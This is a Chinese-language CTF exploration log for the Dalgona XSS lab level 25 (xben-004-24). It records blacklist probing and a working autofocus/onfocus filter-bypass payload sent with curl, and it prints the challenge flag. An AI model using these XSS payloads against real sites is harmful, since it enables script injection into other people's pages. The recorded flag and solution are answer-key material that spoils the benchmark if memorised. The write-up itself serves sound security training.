# xben-004-24 · 探索记录

对应题解：[`xben-004-24.md`](./xben-004-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，响应头 `Server: Werkzeug/1.0.1 Python/2.7.18`——很老的栈。

`GET /` 是 `Dalgona Challenges` 首页，只有一个挑战入口 `xss25`
（`<title>Dalgona - Star</title>`）。这是公开的 Dalgona XSS 靶场系列里的第 25 关。

`GET /xss25`：

```html
<form class="box-form" method="post">
  <div class="solution-text">Let the game begin. Good Luck</div>
  <input type=text name=solution placeholder="Enter solution..." >
</form>
```

响应头 `X-XSS-Protection: 0`。

## 第一阶段：摸清判据

先提交无害输入，看服务端怎么反应：

```bash
curl -X POST -d 'solution=test' http://$T/xss25
```

返回：

```html
<div class="solution-text"><img src=".../error_star.png" alt="Fail"><br>
Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"</div>
```

这一句信息量很大：

1. **服务端有 headless 浏览器在跑页面**，不是把输入直接回显给用户那么简单。
2. **它钩住了 `alert`**，并且把"实际被调用的 alert 参数"回显出来。
3. **期望值是字符串 `"XSS"`**。
4. 当前失败原因是一个 `TypeError`——说明挑战自身的页面脚本在加载时就尝试改某个不可配置的
   setter 并失败，报错被 alert 捕获。

同时看到反射位置：

```html
<input type=text name=solution placeholder="Enter solution..." > test>
```

输入在 `<input>` 之后、模板自带的 `>` 之前，**未转义**。

## 第二阶段：黑名单摸底

逐个试常见载体，看哪些被拦：

| payload | 结果 | 判据 |
| --- | --- | --- |
| `<script>alert(1)</script>` | `Sorry you can't use: 'script'` | 拦 `script` |
| `<img src=x onerror=alert(1)>` | `Sorry you can't use: 'onerror'` | 拦 `onerror` |
| `<b>x</b>` | 通过黑名单，但仍是 TypeError | 标签本身不被拦 |
| `<svg onload=alert("XSS")>` | `Sorry you can't use: 'onload'` | 拦 `onload` |
| `<body onload=...>` | 同上 | `onload` 是全局拦截，与标签无关 |
| `<iframe onload=...>` | 同上 | 同上 |
| `<img src=x onload=...>` | 同上 | 同上 |

结论：黑名单是**按字面量匹配的 token 列表**，至少包含 `script`、`onerror`、`onload`。

## 第三阶段：找一个能自动触发、又不在黑名单上的事件

关键约束：**headless 浏览器不会有用户交互**，所以 `onclick`、`onmouseover`、`onmousemove`
都不会触发。必须是"页面加载后自动发生"的事件。

| payload | 结果 | 判据 |
| --- | --- | --- |
| `<details open ontoggle=alert("XSS")>` | 通过黑名单，但报 TypeError | 能自动触发（`ontoggle`），但 `alert` 参数不是 `XSS` |
| `<marquee onstart=alert("XSS")>` | 通过黑名单，但报 TypeError | `onstart` 未触发或参数不对 |
| `<input autofocus onfocus=alert("XSS")>` | **Congratulations!** | 成功 |
| `<select autofocus onfocus=alert("XSS")>` | **Congratulations!** | 成功 |

`onfocus` 不在黑名单里，而 `autofocus` 让元素在页面加载后立即获得焦点，
于是 `onfocus` 自动触发，无需任何交互。

## 第四阶段：拿 flag

```bash
curl -sS -X POST \
  --data-urlencode 'solution=<input autofocus onfocus=alert("XSS")>' \
  http://$T/xss25
```

```html
<div class="solution-text"><img src=".../success_star.png" alt="Correct"><br>
Congratulations!<p> Here is the flag: flag{2639f2d7-9db5-493b-ad26-9a360de3bc4d}</div>
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<script>alert(1)</script>` | 黑名单拦 | 响应明确写 `Sorry you can't use: 'script'` |
| `<img src=x onerror=alert(1)>` | 黑名单拦 | `'onerror'` |
| `<svg onload=…>` / `<body onload=…>` / `<iframe onload=…>` / `<img onload=…>` | 全部黑名单拦 | `'onload'`，说明按 token 拦而不按标签 |
| `<details open ontoggle=alert("XSS")>` | 自动触发成立，但评分失败 | 报 TypeError，参数不是 `XSS` |
| `<marquee onstart=alert("XSS")>` | 同上 | 同上 |
| 纯文本 `test` | 失败 | 只是把 `test` 渲染成文本节点，无脚本 |

## 这次真正的收获

1. **服务端的"失败原因"就是判据。** 它把 `alert` 的实际参数回显出来了
   （`You did an alert with TypeError: … instead of "XSS"`），
   等于替你把「payload 有没有执行」和「参数对不对」两件事分开回答了。
   有这句提示时不要盲猜，先读它。
2. **黑名单枚举比想象中便宜。** 试 `script`/`onerror`/`onload` 三个就摸出了规律
   （按 token 拦，不按标签），随后只需要在剩下的事件里找一个"加载即触发"的。
3. **无头浏览器环境下，能自动触发的事件才有效。** 优先级：
   `autofocus+onfocus`、`open+ontoggle`、`onerror`（图片加载失败）、`onload`；
   `onclick`/`onmouseover`/`onmousemove` 一律无效。
4. **`ontoggle` 的失败很有教育意义**：它证明了"能触发"和"参数正确"是两件独立的事。
   评分只看 `alert` 收到的字符串。
5. Python 2.7 + Werkzeug 1.0.1 说明这是老靶场；这类题往往黑名单写得很随意
   （只挡几个常见词），枚举成本极低。
